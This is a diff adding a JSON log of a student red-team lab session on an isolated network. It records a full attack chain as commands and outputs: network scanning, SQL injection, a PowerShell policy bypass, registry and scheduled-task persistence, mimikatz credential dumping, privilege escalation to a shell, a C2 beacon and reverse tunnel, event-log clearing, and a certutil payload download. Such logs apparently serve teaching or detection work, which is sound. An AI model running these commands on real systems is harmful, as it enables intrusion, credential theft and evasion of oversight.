@@ -1,0 +1,149 @@
+{
+  "meta": {
+    "session_id": "lab-session-20261114-001",
+    "operator": "red-team-student",
+    "start_time": "2026-11-14T09:00:00Z",
+    "end_time": "2026-11-14T12:30:00Z",
+    "scope": "Isolated lab network 192.168.10.0/24",
+    "authorization": "Lab instructor approval — MYO062 coursework"
+  },
+  "events": [
+    {
+      "timestamp": "2026-11-14T09:05:00Z",
+      "phase": "reconnaissance",
+      "tool": "nmap",
+      "command": "nmap -sV -sC 192.168.10.0/24",
+      "target": "192.168.10.0/24",
+      "output": "Discovered 5 hosts: 192.168.10.1 (gateway), 192.168.10.10 (web-server.lab), 192.168.10.20 (db-server.lab), 192.168.10.30 (dc01.lab), 192.168.10.50 (workstation.lab)",
+      "notes": "Network service discovery across lab subnet"
+    },
+    {
+      "timestamp": "2026-11-14T09:15:00Z",
+      "phase": "reconnaissance",
+      "tool": "nmap",
+      "command": "nmap -p 1-65535 -T4 192.168.10.10",
+      "target": "192.168.10.10",
+      "output": "Open ports: 22/tcp (SSH), 80/tcp (HTTP), 443/tcp (HTTPS), 3306/tcp (MySQL), 8080/tcp (HTTP-Proxy)"
+    },
+    {
+      "timestamp": "2026-11-14T09:25:00Z",
+      "phase": "enumeration",
+      "tool": "systeminfo",
+      "command": "systeminfo on workstation.lab",
+      "target": "192.168.10.50",
+      "output": "OS: Windows Server 2019, Hostname: WORKSTATION, Domain: lab.local"
+    },
+    {
+      "timestamp": "2026-11-14T09:30:00Z",
+      "phase": "enumeration",
+      "tool": "whoami",
+      "command": "whoami /all",
+      "target": "192.168.10.50",
+      "output": "LAB\\student - Group memberships: Users, Remote Desktop Users"
+    },
+    {
+      "timestamp": "2026-11-14T09:40:00Z",
+      "phase": "enumeration",
+      "tool": "net user",
+      "command": "net user /domain",
+      "target": "dc01.lab",
+      "output": "Administrator, Guest, krbtgt, svc_backup, svc_web, student, lab_admin"
+    },
+    {
+      "timestamp": "2026-11-14T09:45:00Z",
+      "phase": "enumeration",
+      "tool": "enum4linux",
+      "command": "enum4linux -a 192.168.10.30",
+      "target": "192.168.10.30",
+      "output": "Shares: ADMIN$, C$, IPC$, NETLOGON, SYSVOL, shared_docs"
+    },
+    {
+      "timestamp": "2026-11-14T10:00:00Z",
+      "phase": "exploitation",
+      "tool": "sqlmap",
+      "command": "sqlmap -u 'http://web-server.lab/search?q=test' --dbs",
+      "target": "web-server.lab",
+      "output": "SQL injection found in parameter 'q'. Databases: information_schema, lab_app, mysql"
+    },
+    {
+      "timestamp": "2026-11-14T10:20:00Z",
+      "phase": "execution",
+      "tool": "powershell",
+      "command": "powershell -ep bypass -c \"IEX(Get-Content C:\\temp\\recon.ps1)\"",
+      "target": "192.168.10.50",
+      "output": "Executed reconnaissance script via PowerShell bypass"
+    },
+    {
+      "timestamp": "2026-11-14T10:35:00Z",
+      "phase": "persistence",
+      "tool": "reg.exe",
+      "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LabPersist /d C:\\temp\\beacon.exe",
+      "target": "192.168.10.50",
+      "output": "Registry Run key added for persistence"
+    },
+    {
+      "timestamp": "2026-11-14T10:50:00Z",
+      "phase": "persistence",
+      "tool": "schtasks",
+      "command": "schtasks /create /tn LabTask /tr C:\\temp\\beacon.exe /sc hourly",
+      "target": "192.168.10.50",
+      "output": "Scheduled task 'LabTask' created successfully"
+    },
+    {
+      "timestamp": "2026-11-14T11:00:00Z",
+      "phase": "credential_access",
+      "tool": "mimikatz",
+      "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+      "target": "192.168.10.50",
+      "output": "Extracted credentials from LSASS memory: lab_admin:P@ssw0rd123 (redacted in report)"
+    },
+    {
+      "timestamp": "2026-11-14T11:15:00Z",
+      "phase": "lateral_movement",
+      "tool": "ssh",
+      "command": "ssh lab_admin@192.168.10.10",
+      "target": "192.168.10.10",
+      "output": "Successfully authenticated to web-server.lab as lab_admin"
+    },
+    {
+      "timestamp": "2026-11-14T11:30:00Z",
+      "phase": "privilege_escalation",
+      "tool": "sudo",
+      "command": "sudo -l (found NOPASSWD for /usr/bin/find)",
+      "target": "192.168.10.10",
+      "output": "Privilege escalation via SUID find binary: find . -exec /bin/sh \\;"
+    },
+    {
+      "timestamp": "2026-11-14T11:45:00Z",
+      "phase": "command_and_control",
+      "tool": "curl",
+      "command": "curl http://192.168.10.1:8443/beacon -d 'status=alive'",
+      "target": "192.168.10.1",
+      "output": "C2 beacon callback to lab C2 server"
+    },
+    {
+      "timestamp": "2026-11-14T12:00:00Z",
+      "phase": "defense_evasion",
+      "tool": "wevtutil",
+      "command": "wevtutil cl Security",
+      "target": "192.168.10.50",
+      "output": "Security event log cleared"
+    },
+    {
+      "timestamp": "2026-11-14T12:10:00Z",
+      "phase": "lateral_movement",
+      "tool": "chisel",
+      "command": "chisel client 192.168.10.1:9090 R:socks",
+      "target": "192.168.10.1",
+      "output": "SOCKS proxy tunnel established for pivoting"
+    },
+    {
+      "timestamp": "2026-11-14T12:20:00Z",
+      "phase": "exfiltration",
+      "tool": "certutil",
+      "command": "certutil -urlcache -split -f http://192.168.10.1:8080/exfil_tool.exe C:\\temp\\tool.exe",
+      "target": "192.168.10.1",
+      "output": "Downloaded exfiltration tool via certutil LOLBin"
+    }
+  ]
+}
